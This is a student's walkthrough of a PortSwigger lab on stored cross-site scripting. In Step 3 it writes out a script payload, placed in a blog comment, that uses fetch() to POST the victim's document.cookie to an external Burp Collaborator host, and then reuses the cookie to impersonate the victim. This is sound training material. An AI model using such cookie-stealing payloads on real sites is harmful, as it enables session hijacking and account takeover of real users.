
### Lab: [Exploiting cross-site scripting to steal cookies](https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies


	Description: This lab contains a stored XSS vulnerability in the blog comments function. A simulated victim user views all comments after they are posted. To solve the lab, exploit the vulnerability to exfiltrate the victim's session cookie, then use this cookie to impersonate the victim.

According to the requirements of the lab, i go to the comment section of the application and exploit the vulnerability.
![](../../Img_note/Pasted%20image%2020221213101611.png)

We will succeed if user who visits the blog post, their cookies will be sent to our server. We can use this cookie to impersonate the victim

Step 1:  Open the application with Burp Suite, comment 1 time and watch the application work
When we comment successfully, application announced that "You comment have been submitted"
and the blog post displays our comment.

Step 2: We need a server to get the resquest (has cookie of victim) if attack is successful
We can use **webhook** or yours server, but in this Lab, we can only use **Burp Collaborators** (default public server of Burp Suite)

```
Brup > Burp Collaborator Client 
```

![](../../Img_note/Pasted%20image%2020221213103830.png)

Step 3: Generate payload exploit the vulnerability to exfiltrate the victim's session cookie
We use **[fetch()](https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch)** to create a [HTTP request](https://developer.mozilla.org/en-US/docs/Web/API/Request)
To get session cookie, we are going to use
	**document.cookie**

Payload (get the url from the Brup Collaborator)1
```
<script> 
fetch('https://r2ux5q20vrzg0p0czzfxh2h34ualya.oastify.com, { 
method: 'POST', 
body:document.cookie }); 
</script>
```

![](../../Img_note/Pasted%20image%2020221213112909.png)

Step 4: Every time someone visits the page have exploiting script 
![](../../Img_note/Pasted%20image%2020221213124914.png)

Step 5: Turn On **Burp Intercept** and reload the website, change the session with the session that we take from previous step and impersonate the victim 
![](../../Img_note/Pasted%20image%2020221213113857.png)